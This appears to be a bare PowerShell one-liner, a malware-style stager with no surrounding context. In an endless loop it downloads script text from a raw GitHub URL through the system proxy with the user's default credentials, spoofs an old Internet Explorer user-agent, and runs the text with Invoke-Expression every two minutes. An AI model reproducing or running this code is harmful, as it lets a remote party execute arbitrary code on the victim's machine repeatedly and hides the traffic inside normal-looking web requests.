
while($true){Start-Sleep -s 120; $m=New-Object System.Net.WebClient;$pr = [System.Net.WebRequest]::GetSystemWebProxy();$pr.Credentials=[System.Net.CredentialCache]::DefaultCredentials;$m.proxy=$pr;$m.UseDefaultCredentials=$true;$m.Headers.Add('user-agent', 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 7.1; Trident/5.0)'); iex(($m.downloadstring('https://raw.githubusercontent.com/rollzedice/js/master/drupal2.js')));}

